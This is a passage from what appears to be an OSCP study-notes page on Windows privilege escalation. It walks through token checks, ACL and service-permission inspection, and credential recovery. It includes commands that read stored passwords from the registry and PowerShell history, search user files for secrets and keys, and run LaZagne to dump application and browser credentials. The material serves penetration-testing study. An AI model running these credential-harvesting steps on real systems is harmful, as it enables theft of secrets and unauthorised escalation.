href="/oscp/notes/ad-investigation/users/">Where do I find useful users and group memberships?</a></li><li><a href="/oscp/notes/ad-investigation/winrm/">WinRM or RDP — why would this account be allowed in?</a></li></ul></details></li><li><details open><summary>Method guides</summary><ul><li><a href="/oscp/notes/methods/ad-identities/">Gain a more useful domain identity</a></li><li><a href="/oscp/notes/methods/ad-mapping/">Map Active Directory attack paths</a></li><li><a href="/oscp/notes/methods/credentials/">Recover and use authentication material</a></li><li><a href="/oscp/notes/methods/discovery/">Discover attack surfaces</a></li><li><a href="/oscp/notes/methods/execution/">Resolve payload execution obstacles</a></li><li><a href="/oscp/notes/methods/integration/">Complete attacks and retain reproducible evidence</a></li><li><a href="/oscp/notes/methods/lateral-movement/">Move to another host</a></li><li><a href="/oscp/notes/methods/linux-privesc/">Escalate privileges on Linux</a></li><li><a href="/oscp/notes/methods/pivoting/">Reach internal services</a></li><li><a href="/oscp/notes/methods/public-exploits/">Select and adapt public exploits</a></li><li><a href="/oscp/notes/methods/services/">Extract opportunities from services</a></li><li><a href="/oscp/notes/methods/sessions-transfers/">Establish sessions and move files</a></li><li><a href="/oscp/notes/methods/web-exploitation/">Turn application weaknesses into access</a></li><li><a href="/oscp/notes/methods/web-mapping/">Map useful web behavior</a></li><li><a href="/oscp/notes/methods/windows-privesc/" aria-current="page">Escalate privileges on Windows</a></li></ul></details></li></ul></details></li></ul></nav><hr><p><a href="/">Website</a> · <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference">Source</a></p></aside><main id="document" tabindex="-1"><article><h1 id="escalate-privileges-on-windows">Escalate privileges on Windows</h1>
+<p><a href="/oscp/notes/Attack_Strategy_Map/">Strategy map</a> | <a href="/oscp/notes/Master_Notes/">Master Notes</a> | <a href="/oscp/">Operational index</a> | <a href="/oscp/cheatsheets/">Cheatsheets</a></p>
+<p>An administrator-group membership, enabled token privilege, writable object and effective privileged execution are different claims. Establish the precise right, consumer identity and available trigger before choosing a route.</p>
+<p><strong>Speedrun blocks:</strong> 9. <strong>Documented methods:</strong> 13.</p>
+<p>Examples are hypothetical study material. Apply commands only to an assigned scope during the later practice phase. A method is enabled by its prerequisites; its presence here does not establish a vulnerability or practical mastery.</p>
+<h2 id="first-pass-tools-and-findings">First pass: tools and findings</h2>
+<p>Use the branch matching the current host, identity and observed result. Tool output supplies leads; the linked procedure verifies and uses the exact condition.</p>
+<h3 id="record-the-token-and-host-context">Record the token and host context</h3>
+<p>Check the current token before choosing an exploit or collector build.</p>
+<pre><code class="language-cmd">hostname
+whoami /all
+systeminfo
+ipconfig /all
+</code></pre>
+<ul>
+<li><strong>If SeImpersonatePrivilege:</strong> Check its enabled state and the operation/access needed by that specific technique. → <a href="/oscp/notes/methods/windows-privesc/#windows-token">Select a privilege-backed impersonation or object-control route</a>.</li>
+<li><strong>If SeBackupPrivilege:</strong> Inspect the permitted backup operation and the exact source it can read. → <a href="/oscp/notes/methods/windows-privesc/#windows-backup">Use backup privilege to obtain protected local credential material</a>.</li>
+<li><strong>If Service/task activity or a useful group membership:</strong> Inspect the actual objects and ACLs. → <a href="/oscp/notes/methods/windows-privesc/#windows-acl">Prove effective file, registry and service-object permissions</a>.</li>
+<li><strong>Otherwise:</strong> No immediate token route: run the broad collector, then verify its service/file findings. → <a href="/oscp/notes/methods/windows-privesc/#windows-enumerators">Turn automated Windows findings into manually verified candidates</a>.</li>
+</ul>
+<h3 id="run-winpeas-early-and-save-its-report">Run winPEAS early and save its report</h3>
+<p>Transfer a reviewed binary matching the host architecture. The log option writes out.txt; inspect it before selecting a route. Native checks remain available if execution is blocked.</p>
+<pre><code class="language-cmd">winPEASx64.exe log
+</code></pre>
+<ul>
+<li><strong>If Modifiable service or writable service binary:</strong> Check sc qc/sdshow and the actual binary/parent ACL, service account and restart rights. → <a href="/oscp/notes/methods/windows-privesc/#windows-service-config">Change a privileged service's executable configuration</a>.</li>
+<li><strong>If Unquoted service path:</strong> Check the exact executable prefixes for write access and a privileged restartable consumer. → <a href="/oscp/notes/methods/windows-privesc/#windows-unquoted">Exploit an unquoted service path with a writable earlier prefix</a>.</li>
+<li><strong>If A saved credential/config finding:</strong> Read the named source and classify the account/material. → <a href="/oscp/notes/methods/windows-privesc/#windows-secrets">Recover Windows application, history and stored-credential artifacts</a>.</li>
+<li><strong>Otherwise:</strong> The collector is blocked or reports no useful candidate: continue native ACL/service/task inspection. → <a href="/oscp/notes/methods/windows-privesc/#windows-acl">Prove effective file, registry and service-object permissions</a>.</li>
+</ul>
+<h3 id="verify-the-specific-servicetask-route">Verify the specific service/task route</h3>
+<p>Configuration write, binary replacement, unquoted-prefix write and dependency loading require different rights.</p>
+<pre><code class="language-cmd">whoami /all
+icacls "C:\Path\To\OBJECT"
+icacls "C:\Path\To"
+sc.exe sdshow SERVICE
+</code></pre>
+<ul>
+<li><strong>If Service configuration can be changed:</strong> Confirm the service runs as a stronger identity and you can cause a start/restart. → <a href="/oscp/notes/methods/windows-privesc/#windows-service-config">Change a privileged service's executable configuration</a>.</li>
+<li><strong>If Only the binary or its parent is writable:</strong> Check replacement semantics, the consumer identity and a trigger. → <a href="/oscp/notes/methods/windows-privesc/#windows-service-binary">Replace a privileged service binary or consumed file</a>.</li>
+<li><strong>If A scheduled task consumes a writable file:</strong> Inspect the task principal, action and schedule. → <a href="/oscp/notes/methods/windows-privesc/#windows-tasks">Control scheduled tasks, startup files or autostart consumers</a>.</li>
+<li><strong>Otherwise:</strong> The highlighted path is not effectively writable: reject that candidate and inspect another actual object. → <a href="/oscp/notes/methods/windows-privesc/#windows-acl">Prove effective file, registry and service-object permissions</a>.</li>
+</ul>
+<h2 id="discovery-workflow">Discovery workflow</h2>
+<p>Start with a Windows foothold. Administrator-group membership, a high-integrity token and a working privileged trigger are separate facts.</p>
+<p>Follow these observations into a method; the detailed recognition routes below show synthetic output and the checks still needed.</p>
+<ol>
+<li>Inspect whoami /all and host/process state before choosing a privilege route: <a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>.</li>
+<li>Inventory real services/tasks and inspect exact object and parent ACLs: <a href="/oscp/notes/methods/windows-privesc/#windows-acl">Prove effective file, registry and service-object permissions</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-service-config">Change a privileged service's executable configuration</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-tasks">Control scheduled tasks, startup files or autostart consumers</a>.</li>
+<li>Separate writable service configuration, replaceable binaries, unquoted prefixes and dependency loads: <a href="/oscp/notes/methods/windows-privesc/#windows-service-binary">Replace a privileged service binary or consumed file</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-unquoted">Exploit an unquoted service path with a writable earlier prefix</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-dll">Control a privileged DLL, helper or configuration load</a>.</li>
+<li>Follow application/history/saved-credential artifacts and exact token privileges: <a href="/oscp/notes/methods/windows-privesc/#windows-secrets">Recover Windows application, history and stored-credential artifacts</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-token">Select a privilege-backed impersonation or object-control route</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-backup">Use backup privilege to obtain protected local credential material</a>.</li>
+<li>Match software/driver/build evidence only after validating simpler permission routes: <a href="/oscp/notes/methods/windows-privesc/#windows-kernel">Select a matching application, driver or kernel exploit</a>.</li>
+</ol>
+<p><strong>Decision rule:</strong> an observed clue opens a candidate. Choose it only after the missing conditions are verified; a failed check rules out that context, while unavailable evidence stays inconclusive.</p>
+<h2 id="method-families">Method families</h2>
+<ul>
+<li><strong>Token, ACL and credential state:</strong> <a href="#windows-state">Establish Windows token, host and process context</a>, <a href="#windows-acl">Prove effective file, registry and service-object permissions</a>, <a href="#windows-secrets">Recover Windows application, history and stored-credential artifacts</a>.</li>
+<li><strong>Services and privileged consumers:</strong> <a href="#windows-service-config">Change a privileged service's executable configuration</a>, <a href="#windows-service-binary">Replace a privileged service binary or consumed file</a>, <a href="#windows-unquoted">Exploit an unquoted service path with a writable earlier prefix</a>, <a href="#windows-dll">Control a privileged DLL, helper or configuration load</a>, <a href="#windows-tasks">Control scheduled tasks, startup files or autostart consumers</a>.</li>
+<li><strong>Installer and token-backed operations:</strong> <a href="#windows-installer">Validate elevated installer policy and administrative-token context</a>, <a href="#windows-token">Select a privilege-backed impersonation or object-control route</a>, <a href="#windows-backup">Use backup privilege to obtain protected local credential material</a>.</li>
+<li><strong>Software and candidate generation:</strong> <a href="#windows-kernel">Select a matching application, driver or kernel exploit</a>, <a href="#windows-enumerators">Turn automated Windows findings into manually verified candidates</a>.</li>
+</ul>
+<h2 id="choose-a-method">Choose a method</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Method</th><th>Recognition clue</th><th>Required access</th><th>Enabling conditions</th><th>Resulting capability</th></tr></thead><tbody><tr><td><a href="#windows-state">Establish Windows token, host and process context</a></td><td>A new Windows session or claimed administrator/SYSTEM transition</td><td>A verified Windows foothold with a known token, integrity level and groups</td><td>A functioning command channel and the actual effective token/process context</td><td>A verified identity, integrity, privilege and host state for candidate selection</td></tr><tr><td><a href="#windows-acl">Prove effective file, registry and service-object permissions</a></td><td>A privileged object appears writable or an ACL tool reports a useful right</td><td>A verified Windows foothold with a known token, integrity level and groups</td><td>Correct trustee/token, object type and effective rights including parents and deny entries</td><td>A specific confirmed control primitive for a privileged consumer</td></tr><tr><td><a href="#windows-secrets">Recover Windows application, history and stored-credential artifacts</a></td><td>Readable application configuration, unattended setup, PowerShell trails or Credential Manager entries</td><td>A verified Windows foothold with a known token, integrity level and groups</td><td>Artifact read permission and exact protecting identity/context for saved or DPAPI material</td><td>Typed secret material or a verified saved-credential consumer transition</td></tr><tr><td><a href="#windows-service-config">Change a privileged service's executable configuration</a></td><td>Effective SERVICE_CHANGE_CONFIG on a higher-privileged service</td><td>A verified Windows foothold with a known token, integrity level and groups</td><td>Configuration-change right, accessible compatible payload path and a separate start/restart trigger</td><td>Verified execution under the configured service identity</td></tr><tr><td><a href="#windows-service-binary">Replace a privileged service binary or consumed file</a></td><td>A privileged service consumes a file whose bytes or parent replacement are controllable</td><td>A verified Windows foothold with a known token, integrity level and groups</td><td>Effective file/parent replacement rights, compatible artifact, file-lock handling and available privileged restart/boot trigger</td><td>Verified execution of the replacement under the service identity</td></tr><tr><td><a href="#windows-unquoted">Exploit an unquoted service path with a writable earlier prefix</a></td><td>A service command line contains unquoted spaces</td><td>A verified Windows foothold with a known token, integrity level and groups</td><td>An earlier executable prefix is absent and creatable, service identity is higher and a start/restart trigger exists</td><td>Verified execution of the earlier executable candidate</td></tr><tr><td><a href="#windows-dll">Control a privileged DLL, helper or configuration load</a></td><td>A privileged application searches for a missing dependency or consumes writable configuration</td><td>A verified Windows foothold with a known token, integrity level and groups</td><td>Actual controlled resolution path, compatible name/architecture/exports and a reliable privileged load trigger</td><td>Verified privileged consumption of the chosen dependency</td></tr><tr><td><a href="#windows-tasks">Control scheduled tasks, startup files or autostart consumers</a></td><td>A task/startup action consumes a writable command, file, directory or registry value</td><td>A verified Windows foothold with a known token, integrity level and groups</td><td>Effective object control, a higher principal and a usable scheduled/logon/manual trigger</td><td>Verified privileged task or startup execution</td></tr><tr><td><a href="#windows-installer">Validate elevated installer policy and administrative-token context</a></td><td>Installer policy values or an administrator account with a filtered token</td><td>A verified Windows foothold with a known token, integrity level and groups</td><td>AlwaysInstallElevated requires both effective machine/user policy values and permitted MSI execution; UAC routes require their own compatible administrator/token context</td><td>A verified installer-policy execution route or a precise token-boundary assessment</td></tr><tr><td><a href="#windows-token">Select a privilege-backed impersonation or object-control route</a></td><td>whoami /priv exposes a relevant token privilege</td><td>A verified Windows foothold with a known token, integrity level and groups</td><td>The exact privilege and usable operation; impersonation additionally needs a compatible privileged authentication source, OS/service state and executable context</td><td>A verified token-backed identity or privileged-object operation</td></tr><tr><td><a href="#windows-backup">Use backup privilege to obtain protected local credential material</a></td><td>A token has the relevant backup rights and protected registry/files are a useful credential source</td><td>A verified Windows foothold with a known token, integrity level and groups</td><td>Usable backup privilege, compatible backup API/command and a matched protected source set with a writable destination</td><td>Matched credential material suitable for offline parsing</td></tr><tr><td><a href="#windows-kernel">Select a matching application, driver or kernel exploit</a></td><td>An exact vulnerable local component is present after simpler paths are assessed</td><td>A verified Windows foothold with a known token, integrity level and groups</td><td>Affected build/patch/architecture, required service/driver/configuration and compatible exploit assumptions</td><td>A justified local exploit and independently verified higher-privilege result</td></tr><tr><td><a href="#windows-enumerators">Turn automated Windows findings into manually verified candidates</a></td><td>A Windows foothold is available; run winPEAS or a focused survey for service/task permissions, token privileges and credentials</td><td>A verified Windows foothold with a known token, integrity level and groups</td><td>Verified current token and architecture, a compatible reviewed executable or allowed PowerShell runtime, and a writable report location</td><td>A shortlist of permissions, consumers and credential sources to validate</td></tr></tbody></table>
+<p><a id="windows-state"></a></p>
+<h2 id="establish-windows-token-host-and-process-context">Establish Windows token, host and process context</h2>
+<p><strong>Blocks:</strong> 9. <a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/#1-establish-token-and-host-state">Operational procedure</a> | <a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/#13-verify-re-enumerate-and-preserve-evidence">Operational procedure</a> | <a href="/oscp/cheatsheets/windows-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result">1. Purpose and result</h3>
+<p>A verified identity, integrity, privilege and host state for candidate selection.</p>
+<h3 id="2-recognition-clues">2. Recognition clues</h3>
+<p>A new Windows session or claimed administrator/SYSTEM transition.</p>
+<h4 id="find-the-clue-from-your-starting-access">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> At a new foothold inspect the complete token and host/service inventory before classifying the session as an administrator.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-cmd">whoami /all
+systeminfo
+tasklist /svc
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">BUILTIN\Administrators: Group used for deny only
+Mandatory Label\Medium Mandatory Level
+</code></pre>
+<p><strong>Recognize this detail:</strong> An Administrators SID exists but this effective process is filtered/medium-integrity.</p>
+<p><strong>Still missing before method selection:</strong> Check actual enabled privileges and object operations in the process that will perform the action.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>A higher-integrity/SYSTEM token and intended operation are verified: record that privilege state.</td></tr><tr><td>Ruled out in this context</td><td>A medium filtered token cannot perform the assumed administrative action: reject that privilege assumption.</td></tr><tr><td>Inconclusive</td><td>Username/group membership alone leaves token state unknown; inspect whoami /all.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/sessions-transfers/#session-proof">Verify command execution, host and represented identity</a>.</p>
+<h3 id="3-prerequisites">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Windows foothold with a known token, integrity level and groups. <strong>Required conditions:</strong> A functioning command channel and the actual effective token/process context.</p>
+<h3 id="4-discover-and-verify-prerequisites">4. Discover and verify prerequisites</h3>
+<pre><code class="language-cmd">hostname
+whoami /all
+systeminfo
+ipconfig /all
+</code></pre>
+<h3 id="5-why-it-works">5. Why it works</h3>
+<p>Group membership can be filtered in a token, and a network logon context can differ from interactive access. Check privileges and integrity where the intended operation runs.</p>
+<h3 id="6-execute-and-choose-variants">6. Execute and choose variants</h3>
+<pre><code class="language-cmd">hostname
+whoami /all
+systeminfo
+ipconfig /all
+route print
+netstat -ano
+tasklist /svc
+query user
+net user
+net localgroup Administrators
+driverquery /v
+</code></pre>
+<pre><code class="language-powershell">Get-ComputerInfo | Select-Object WindowsProductName,WindowsVersion,OsBuildNumber,OsArchitecture
+Get-HotFix | Sort-Object InstalledOn -Descending
+Get-CimInstance Win32_Process | Select-Object ProcessId,Name,ExecutablePath,CommandLine
+Get-CimInstance Win32_Service | Select-Object Name,StartName,State,StartMode,PathName
+Get-CimInstance Win32_SystemDriver | Select-Object Name,State,StartMode,PathName
+Get-LocalUser
+Get-LocalGroupMember Administrators
+</code></pre>
+<blockquote>
+<p><strong>Interpret:</strong> record user SID, integrity label, enabled/deny-only groups and present/enabled privileges. Administrator membership with Medium integrity is a filtered token, not a high-integrity process. <code>Get-HotFix</code> does not list every update; use build/KB output only to form a version hypothesis.</p>
+</blockquote>
+<details>
+<summary><strong>WMIC compatibility fallbacks</strong></summary>
+<pre><code class="language-cmd">wmic qfe get HotFixID,InstalledOn
+wmic service get Name,StartName,State,StartMode,PathName
+wmic process get ProcessId,Name,ExecutablePath,CommandLine
+</code></pre>
+<blockquote>
+<p>WMIC is deprecated and may be absent on newer systems; PowerShell CIM is the baseline.</p>
+</blockquote>
+</details>
+<pre><code class="language-cmd">whoami /all
+hostname
+ipconfig /all
+</code></pre>
+<p>After a higher token, re-enumerate protected credentials, services, tasks, sessions, listeners, routes and domain context. Preserve the command, relevant output, trigger and restoration step. For exam use, recheck the current OffSec guide: Windows full-privilege evidence requires SYSTEM, Administrator or an account with Administrator privileges, and AI/LLM use is prohibited during the exam and report phase.</p>
+<h3 id="7-worked-example--hypothetical">7. Worked example — hypothetical</h3>
+<p>Observation: the username belongs to Administrators. Test: inspect token groups/integrity and effective privileges. Illustrative output: the administrator SID is deny-only in a medium token. Interpretation: do not assume high-integrity service-control rights.</p>
+<h3 id="8-verify-the-result">8. Verify the result</h3>
+<p>Verify represented user/SID, enabled group/privilege state and actual privileged operation.</p>
+<h3 id="9-failure-and-fallback">9. Failure and fallback</h3>
+<p>A prompt title or account name is insufficient. WMIC may be absent; use the documented CIM/PowerShell alternatives.</p>
+<h3 id="10-next-transitions">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/windows-privesc/#windows-acl">Prove effective file, registry and service-object permissions</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-service-config">Change a privileged service's executable configuration</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-token">Select a privilege-backed impersonation or object-control route</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-unquoted">Exploit an unquoted service path with a writable earlier prefix</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-installer">Validate elevated installer policy and administrative-token context</a>.</p>
+<p><a id="windows-acl"></a></p>
+<h2 id="prove-effective-file-registry-and-service-object-permissions">Prove effective file, registry and service-object permissions</h2>
+<p><strong>Blocks:</strong> 9. <a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/#2-interpret-effective-access">Operational procedure</a> | <a href="/oscp/cheatsheets/windows-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-1">1. Purpose and result</h3>
+<p>A specific confirmed control primitive for a privileged consumer.</p>
+<h3 id="2-recognition-clues-1">2. Recognition clues</h3>
+<p>A privileged object appears writable or an ACL tool reports a useful right.</p>
+<h4 id="find-the-clue-from-your-starting-access-1">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Take a real service/task/application path from inventory, then inspect its file, parent and separate service-object permissions.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-cmd">icacls "C:\Path\To\OBJECT"
+icacls "C:\Path\To"
+sc.exe sdshow SERVICE
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">File: BUILTIN\Users:(RX)
+Parent: DOMAIN\GROUP:(M)
+Service-object rights: separate DACL
+</code></pre>
+<p><strong>Recognize this detail:</strong> A modifiable parent can differ from a read-only file; service configuration rights are another control plane.</p>
+<p><strong>Still missing before method selection:</strong> Use icacls/Get-Acl on the reported object and parents. For a service also inspect sc qc/sc sdshow; for a task inspect its action/principal. Check the specific write/replace/configuration operation and its trigger.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The intended effective operation and higher consumer are proved: select that object-control method.</td></tr><tr><td>Ruled out in this context</td><td>Only read/execute applies to the current token: reject the proposed modification.</td></tr><tr><td>Inconclusive</td><td>An ACL for an inactive or ambiguous group leaves effective access unresolved.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>.</p>
+<h3 id="3-prerequisites-1">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Windows foothold with a known token, integrity level and groups. <strong>Required conditions:</strong> Correct trustee/token, object type and effective rights including parents and deny entries.</p>
+<h3 id="4-discover-and-verify-prerequisites-1">4. Discover and verify prerequisites</h3>
+<pre><code class="language-cmd">whoami /all
+icacls "C:\Path\To\OBJECT"
+icacls "C:\Path\To"
+sc.exe sdshow SERVICE
+</code></pre>
+<h3 id="5-why-it-works-1">5. Why it works</h3>
+<p>A service-object DACL controls operations such as configuration changes; the executable's filesystem ACL is separate. Parent delete/create rights can allow replacement without direct file modification.</p>
+<h3 id="6-execute-and-choose-variants-1">6. Execute and choose variants</h3>
+<pre><code class="language-cmd">icacls "C:\Path\To\OBJECT"
+sc.exe sdshow SERVICE
+accesschk.exe -accepteula -nobanner -v -w "USER" "C:\Path\To\OBJECT"
+accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE
+</code></pre>
+<p><code>icacls</code> common rights: <code>F</code> full, <code>M</code> modify, <code>RX</code> read/execute, <code>R</code> read, <code>W</code> write, <code>D</code> delete. Common inheritance markers: <code>I</code>, <code>OI</code>, <code>CI</code>, <code>IO</code>, <code>NP</code>.</p>
+<blockquote>
+<p>File, directory, registry, service-object, task and process permissions are separate. Check whether the ACE applies to the current user or an enabled group and grants the exact required operation. Mandatory Integrity Control can still block a lower-integrity write.</p>
+</blockquote>
+<h3 id="7-worked-example--hypothetical-1">7. Worked example — hypothetical</h3>
+<p>Observation: a service executable is read-only but its directory grants replacement rights. Test: inspect the effective token and parent permissions. Illustrative output: replacement is possible but service restart is denied. Interpretation: the control primitive is valid; the trigger remains missing.</p>
+<h3 id="8-verify-the-result-1">8. Verify the result</h3>
+<p>Name the exact allowed operation on the exact object and independently check a privileged consumer/trigger.</p>
+<h3 id="9-failure-and-fallback-1">9. Failure and fallback</h3>
+<p>Generic write labels can refer to another object or an inactive group. Resolve actual effective rights before modifying anything.</p>
+<h3 id="10-next-transitions-1">10. Next transitions</h3>
+<p><a href="/oscp/notes/methods/windows-privesc/#windows-service-binary">Replace a privileged service binary or consumed file</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-tasks">Control scheduled tasks, startup files or autostart consumers</a>; <a href="/oscp/notes/methods/windows-privesc/#windows-dll">Control a privileged DLL, helper or configuration load</a>.</p>
+<p><a id="windows-secrets"></a></p>
+<h2 id="recover-windows-application-history-and-stored-credential-artifacts">Recover Windows application, history and stored-credential artifacts</h2>
+<p><strong>Blocks:</strong> 9. <a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/#3-hunt-credentials-and-configuration">Operational procedure</a> | <a href="/oscp/reference/04-shells-transfers-credentials/04-file-and-repository-hunting/#windows-scoped-file-hunting">Operational procedure</a> | <a href="/oscp/cheatsheets/windows-privesc/">Quick sheet</a></p>
+<h3 id="1-purpose-and-result-2">1. Purpose and result</h3>
+<p>Typed secret material or a verified saved-credential consumer transition.</p>
+<h3 id="2-recognition-clues-2">2. Recognition clues</h3>
+<p>Readable application configuration, unattended setup, PowerShell trails or Credential Manager entries.</p>
+<h4 id="find-the-clue-from-your-starting-access-2">Find the clue from your starting access</h4>
+<p><strong>Where to investigate:</strong> Follow actual application/configuration paths, PSReadLine history and saved-credential targets under the current readable user context.</p>
+<p><strong>Discovery action — reference example:</strong></p>
+<pre><code class="language-cmd">cmdkey /list
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
+</code></pre>
+<p><strong>Illustrative evidence — synthetic, abbreviated:</strong></p>
+<p>The excerpt may combine command fields with labelled observations from the preceding investigation; it is not a real-target transcript or a promise of exact tool formatting.</p>
+<pre><code class="language-text">cmdkey target: Domain:target=TARGET_HOST
+User: DOMAIN\USER
+Password: not displayed
+</code></pre>
+<p><strong>Recognize this detail:</strong> A target-bound saved credential is a possible consumer capability, not a plaintext password.</p>
+<p><strong>Still missing before method selection:</strong> Establish protecting user/context, intended logon type and an actually permitted saved-credential or decryption route.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Outcome after checking</th><th>Example and next decision</th></tr></thead><tbody><tr><td>Enabled after validation</td><td>The matching consumer accepts the credential and the resulting token is checked: use that access.</td></tr><tr><td>Ruled out in this context</td><td>The stored entry belongs to another context/target and cannot be used here: reject that transition.</td></tr><tr><td>Inconclusive</td><td>A protected blob/listing without keys or consumer evidence leaves usable credentials unproved.</td></tr></tbody></table>
+<p><strong>If you do not yet have this clue:</strong> start with <a href="/oscp/notes/methods/windows-privesc/#windows-state">Establish Windows token, host and process context</a>.</p>
+<h3 id="3-prerequisites-2">3. Prerequisites</h3>
+<p><strong>Starting access:</strong> A verified Windows foothold with a known token, integrity level and groups. <strong>Required conditions:</strong> Artifact read permission and exact protecting identity/context for saved or DPAPI material.</p>
+<h3 id="4-discover-and-verify-prerequisites-2">4. Discover and verify prerequisites</h3>
+<pre><code class="language-cmd">cmdkey /list
+whoami /all
+</code></pre>
+<h3 id="5-why-it-works-2">5. Why it works</h3>
+<p>A cmdkey entry proves a target-bound stored credential, not plaintext disclosure. Saved-credential use and DPAPI decryption require matching contexts; runas does not inherently bypass UAC.</p>
+<h3 id="6-execute-and-choose-variants-2">6. Execute and choose variants</h3>
+<h5 id="stored-credentials-and-powershell-trails">Stored credentials and PowerShell trails</h5>
+<pre><code class="language-cmd">cmdkey /list
+vaultcmd /list
+vaultcmd /listcreds:"Windows Credentials" /all
+</code></pre>
+<pre><code class="language-powershell">$history = (Get-PSReadLineOption).HistorySavePath
+$history
+Get-Content -LiteralPath $history -ErrorAction SilentlyContinue
+Get-ItemProperty 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription' -ErrorAction SilentlyContinue
+Get-ItemProperty 'HKCU:\Software\Policies\Microsoft\Windows\PowerShell\Transcription' -ErrorAction SilentlyContinue
+Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -ErrorAction SilentlyContinue |
+  Where-Object Id -in 4103,4104 | Select-Object -First 50 TimeCreated,Id,Message
+</code></pre>
+<blockquote>
+<p>A <code>cmdkey</code> entry is target/context-bound and does not reveal a password. DPAPI-protected data needs the protecting user/machine context and keys. <code>Clear-History</code> does not necessarily clear PSReadLine's saved file.</p>
+</blockquote>
+<details>
+<summary><strong>Targeted application/file/registry search</strong></summary>
+<pre><code class="language-cmd">reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
+dir /s /b C:\Windows\Panther\*unattend*.xml C:\Windows\System32\Sysprep\*.xml 2>nul
+dir /s /b C:\Users\*.kdbx C:\Users\*.rdp C:\Users\id_rsa C:\Users\*.ppk 2>nul
+</code></pre>
+<pre><code class="language-powershell">Get-ChildItem C:\inetpub,C:\ProgramData,C:\Users -Recurse -File -ErrorAction SilentlyContinue |
+  Where-Object { $_.Extension -in '.config','.xml','.ini','.txt','.ps1','.bat','.cmd','.yml','.yaml','.json' } |
+  Select-String -Pattern 'password|passwd|secret|token|connectionString|user id=' -CaseSensitive:$false
+</code></pre>
+<blockquote>
+<p>Search from observed applications first. Classify every value by identity, format, scope and compatible service, then use the credential procedure.</p>
+</blockquote>
+</details>
+<details>
+<summary><strong>Saved credential consumer</strong></summary>
+<pre><code class="language-cmd">runas /savecred /user:DOMAIN\USER cmd.exe
+</code></pre>
+<blockquote>
+<p>Use only when <code>cmdkey</code>/context supports that identity and logon type. <code>runas</code> does not inherently bypass UAC; verify the resulting token with <code>whoami /all</code>.</p>
+</blockquote>
+</details>
+<details>
+<summary><strong>LaZagne — recover application credentials in the current user's context</strong></summary>
+<p>Use a reviewed Windows build after identifying the current user and installed applications. Start with the relevant family; run broader collection only when useful. User-protected stores depend on that user's profile/decryption context; system-protected stores can need an elevated token.</p>
+<pre><code class="language-cmd">REM Browser-store leads for the current user
+laZagne.exe browsers
+
+REM Broader recovery, with a local text report
+laZagne.exe all -oN
+</code></pre>
+<blockquote>
+<p><strong>Read:</strong> preserve the reported application/account/source with each recovered value. Test a matching service using the credential procedure; a recovered application password is not automatically a domain password. Empty output can mean no supported store, inaccessible profile or failed decryption. Follow manual history/config/vault checks instead of assuming there are no credentials.</p>
+</blockquote>
+<p><a href="https://github.com/AlessandroZ/LaZagne">LaZagne upstream</a>.</p>
+</details>
+<pre><code class="language-powershell">Get-ChildItem C:\Users,C:\ProgramData,C:\inetpub -File -Recurse -ErrorAction SilentlyContinue |
